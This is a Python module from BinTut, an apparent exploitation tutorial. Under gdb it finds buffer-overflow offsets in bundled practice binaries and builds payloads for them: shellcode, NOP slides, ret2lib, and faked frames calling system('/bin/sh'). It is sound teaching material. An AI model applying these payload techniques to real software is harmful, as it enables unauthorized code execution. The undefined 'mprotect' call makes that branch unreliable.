"""
Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>

This file is part of BinTut.

BinTut is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

BinTut is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with BinTut.  If not, see <http://www.gnu.org/licenses/>.
"""


from __future__ import division, absolute_import, print_function
import logging
from os.path import join, realpath, relpath
from sys import stderr

try:
    import gdb
except ImportError:
    pass
from pkg_resources import resource_filename
from pat import Pat

from .init import LevelFormatter, red, cyan
from .utils import select_target
from .repl import redisplay
from .exploit import (
    Environment, Payload, Fill, Plain, Nop, Shellcode, Ret2Fun,
    Faked)
from .utils import pause


pat = Pat()


def main(course, bits, burst, level):
    Environment(bits=bits)
    logger = logging.getLogger()
    handler = logging.StreamHandler(stderr)
    handler.setFormatter(LevelFormatter())
    logger.addHandler(handler)
    logger.setLevel(level)
    init()
    bin_name = select_target(course, bits)
    root = resource_filename(__name__, '')
    target = realpath(join(root, 'targets', bin_name))
    name = '{}-{}.bin'.format(course, 'x86' if bits == 32 else 'x64')
    name = realpath(name)
    with open(name, 'w') as stream:
        stream.write(pat.create(400))
    offset, addr = get_offset(target, name, bits, burst, course)
    if offset:
        logging.info('\nFound offset: %s', offset)
        payload = make_payload(offset, addr, course, bits)
        logging.info('Writing payload: %s', name)
        with open(name, 'wb') as stream:
            stream.write(payload)
        # TODO: Implement a pretty printer for humans.
        logging.info('%s Bytes', len(payload))
        logging.info(payload)
        pause(cyan('Enter to test the payload...'))
        get_offset(target, name, bits, burst, course)
    else:
        logging.error('Offset Not Found')


def get_offset(target, name, bits, burst, course):
    gdb.execute('file {}'.format(target))
    gdb.execute('start {}'.format(name))
    sp = '$esp' if bits == 32 else '$rsp'
    ip = '$eip' if bits == 32 else '$rip'
    wide = '32wx' if bits == 32 else '16gx'
    last_stack = ''
    while True:
        try:
            cur_stack = gdb.execute('x/{} {}'.format(wide, sp),
                                 to_string=True)
            last_stack = cur_stack
        except gdb.error as error:
            if bits == 64:
                gdb.execute('file {}'.format(target))
                gdb.execute('start {}'.format(name))
                logging.error(last_stack)
                pattern = last_stack.split()[1]
                offset = pat.locate(pattern)
                addr = last_stack.split(':')[0]
                logging.info('addr: %s', addr)
                addr = hex(int(addr, 16) + 8)
                addr = '{:#018x}'.format(int(addr, 16))
                logging.info('pattern: %s offset: %s addr: %s',
                             pattern, offset, addr)
                return offset, addr
            else:
                logging.error(error)
                logging.error('Exiting Gracefully...')
                break
        try:
            eip = gdb.execute('x/i {}'.format(ip), to_string=True)
        except gdb.MemoryError as error:
            logging.error(error)
            pattern = error.args[0].split()[-1]
            addr = cur_stack.split(':')[0]
            offset = pat.locate(pattern)
            logging.info('pattern: %s addr: %s offset: %s',
                         pattern, addr, offset)
            if burst:
                pass
            else:
                pause('Enter to return...')
            return offset, addr
        if 'call' in eip and '<read_file>' in eip:
            gdb.execute('stepi', to_string=True)
        elif '<system>' in eip and burst:
            gdb.execute('continue')
        else:
            try:
                gdb.execute('nexti', to_string=True)
            except KeyboardInterrupt:
                break
            except gdb.MemoryError as error:
                logging.error(error)
        redisplay(bits, burst=burst,
                  target=relpath(target), course=course)
    return None, None


def init():
    gdb.execute('set pagination off')
    gdb.execute('set disassembly-flavor intel')
    # TODO: Remove this for ASLR-bypassing courses.
    gdb.execute('set disable-randomization on')


# TODO: Make it a class.
def make_payload(offset, addr, post, bits):
    if post == 'plain':
        payload = Fill(offset) + Plain(addr) + Shellcode()
    elif post == 'nop-slide':
        payload = Fill(offset) + Plain(addr) + Nop(32) + Shellcode()
    elif post == 'ret2lib':
        payload = Fill(offset) + Ret2Fun()
    elif post == 'frame-faking':
        payload = (
            Faked(offset=offset, address=addr) +
            Faked('system', ['/bin/sh']) +
            Faked('system', ['/bin/sh']) +
            Faked('exit', [0]))
    elif post == 'mprotect':
        payload = mprotect(offset, addr)
    return payload.payload
